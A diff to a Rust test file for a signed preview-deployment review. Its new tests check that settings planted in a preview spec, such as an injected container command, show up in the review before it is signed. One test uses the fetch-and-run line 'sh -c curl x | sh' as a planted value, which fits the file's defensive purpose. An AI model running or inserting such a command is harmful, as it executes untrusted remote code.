@@ -762,11 +762,16 @@ fn a_drafted_review_admits_the_spec_it_was_drafted_from() {
     let drafted =
         PreviewReview::draft(&rule, &namespace, &[requested(spec.clone())], terms(&rule)).unwrap();
     assert!(drafted.secrets, "web inherits a parent value");
-    assert_eq!(drafted.lines.len(), 1);
-    assert!(
-        drafted.lines[0].starts_with("Review web at fedcba987654"),
-        "{:?}",
-        drafted.lines
+    assert_eq!(
+        drafted.lines,
+        [
+            "Review web at fedcba987654 (reads DATABASE_URL from the parent, hook /bin/sh -c migrate)",
+            r#"  variables DATABASE_URL=(sealed "DATABASE_URL" from environment 11111111-1111-1111-1111-111111111111), DB=db.shop-production.internal, GEN="${{ secret(16, \"a-z\") }}""#,
+            r#"  pre-deploy ["/bin/sh","-c","migrate"]"#,
+            r#"  mounts [{"no_copy":false,"read_only":false,"target":"/data","volume":"vol-5"}]"#,
+            r#"  ports [{"container_port":80,"hostname":"web.{preview-namespace}.preview.example.com","http_protocol":"http","load_balancer_port":443,"mode":"ingress"}]"#,
+            r#"  volumes [{"reference":"vol-5","source":{"driver":{"name":"local","options":{}},"kind":"ordinary","labels":{},"name":"{preview-namespace}_vol-5"}}]"#,
+        ]
     );
     let assertion = passkey.answer(&Answer {
         challenge: review_digest(&drafted.body).as_bytes(),
@@ -793,6 +798,49 @@ fn a_drafted_review_admits_the_spec_it_was_drafted_from() {
         review: Some(checked),
     };
     assert_eq!(case.create(), Ok(ImageDigest::from_bytes([0x44; 32])));
+}
+
+/// A field Cloud plants in the preview's spec shows in the review before it is signed,
+/// not only as "settings differ from the preview rule".
+#[test]
+fn a_planted_setting_shows_in_the_review() {
+    let rule = rule();
+    let namespace = preview_namespace(rule.rule, &PreviewKey::Fork(7));
+    let mut spec = preview_json(namespace.as_str(), "zyxwvutsrqponmlk", false);
+    spec["container"]["command"] = json!(["sh", "-c", "curl x | sh"]);
+    let drafted =
+        PreviewReview::draft(&rule, &namespace, &[requested(spec)], terms(&rule)).unwrap();
+    assert!(
+        drafted.lines[0].contains("settings differ from the preview rule"),
+        "{:?}",
+        drafted.lines
+    );
+    assert!(
+        drafted
+            .lines
+            .contains(&r#"  command ["sh","-c","curl x | sh"]"#.to_owned()),
+        "{:?}",
+        drafted.lines
+    );
+}
+
+/// The template digest keeps a Config's bytes as they are, so a Config that names the
+/// preview's Namespace reads apart from one that writes the placeholder itself.
+#[test]
+fn a_config_naming_the_namespace_reads_apart_from_the_placeholder() {
+    let rule = rule();
+    let namespace = preview_namespace(rule.rule, &PreviewKey::Fork(7));
+    let lines = |text: String| {
+        let mut spec = preview_json(namespace.as_str(), "zyxwvutsrqponmlk", false);
+        spec["configs"] = json!([{"name": "site", "content": text.into_bytes()}]);
+        PreviewReview::draft(&rule, &namespace, &[requested(spec)], terms(&rule))
+            .unwrap()
+            .lines
+    };
+    assert_ne!(
+        lines(format!("echo {}", namespace.as_str())),
+        lines(format!("echo {NAMESPACE_PLACEHOLDER}"))
+    );
 }
 
 #[test]
